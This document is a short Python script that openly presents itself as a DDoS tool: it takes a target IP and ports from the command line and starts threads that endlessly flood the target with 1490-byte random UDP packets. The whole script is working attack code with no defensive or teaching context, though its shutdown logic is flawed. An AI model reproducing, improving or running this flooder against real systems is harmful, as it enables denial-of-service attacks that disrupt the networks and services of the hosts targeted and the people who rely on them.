import sys
import socket
import random
from datetime import datetime
import threading

if len(sys.argv) != 3:
    print("Usage: python script.py <port1,port2,...> <target_ip>")
    sys.exit(1)

# Extracting ports from the command line and converting them to integers
ports = [int(port) for port in sys.argv[1].split(',')]
ip = sys.argv[2]

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def ddos(port):
    while True:
        sock.sendto(bytes, (ip, port))

def main():
    print("SMASHIN EM!")
    print("DDOS starting now...")
    threads = []

    for port in ports:
        thread = threading.Thread(target=ddos, args=(port,))
        threads.append(thread)
        thread.start()

    try:
        # Keep the program running until interrupted by the user (Ctrl+C)
        while True:
            pass
    except KeyboardInterrupt:
        print("Stopping threads and exiting gracefully.")
        # Stop the threads by breaking out of the infinite loop
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()








